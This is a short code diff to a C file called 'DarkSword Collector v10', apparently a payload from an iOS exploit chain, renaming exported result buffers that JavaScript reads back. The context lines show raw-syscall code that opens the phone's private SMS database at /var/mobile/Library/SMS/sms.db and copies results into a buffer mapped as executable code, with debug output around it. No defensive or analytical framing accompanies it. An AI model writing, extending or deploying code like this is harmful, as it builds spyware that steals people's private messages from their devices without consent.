@@ -1,6 +1,6 @@
 /**
  * DarkSword Collector v10 - Buffer in __TEXT,__text (code section, RWX)
- * Exported _result_buf and _result_len for JS to read via cDylibBuf
+ * Exported result_buf and result_len for JS to read via cDylibBuf
  */
 
 static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
@@ -43,24 +43,24 @@ static void _stderr(const char *msg) {
     _svc3(4, 2, (long)msg, _strlen(msg));
 }
 
-/* Exported buffers in __TEXT,__text (mapped RWX by MachOPayloadBuilder) */
-__attribute__((used)) char _result_buf[512];
-__attribute__((used)) int _result_len;
+/* Exported buffers for JS to read via cDylibBuf */
+char result_buf[512];
+int result_len;
 
 static void _append(const char *s) {
     int sl = _strlen(s);
-    int pos = _result_len;
+    int pos = result_len;
     if (pos + sl < 511) {
-        _memcpy(_result_buf + pos, s, sl);
-        _result_len = pos + sl;
-        _result_buf[_result_len] = 0;
+        _memcpy(result_buf + pos, s, sl);
+        result_len = pos + sl;
+        result_buf[result_len] = 0;
     }
 }
 static void _append_int(int v) { char b[16]; _itoa(v,b); _append(b); }
 
 void ds_start(void) {
-    _result_buf[0] = 0;
-    _result_len = 0;
+    result_buf[0] = 0;
+    result_len = 0;
     _stderr("[v10] start\n");
 
     int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
@@ -84,8 +84,8 @@ void ds_start(void) {
     }
 
     _stderr("[v10] len=");
-    char rlb[8]; _itoa(_result_len, rlb); _stderr(rlb);
+    char rlb[8]; _itoa(result_len, rlb); _stderr(rlb);
     _stderr(" buf[0]=");
-    char bb[4]; bb[0]=_result_buf[0]; bb[1]=0; _stderr(bb);
+    char bb[4]; bb[0]=result_buf[0]; bb[1]=0; _stderr(bb);
     _stderr("\n[v10] done\n");
 }
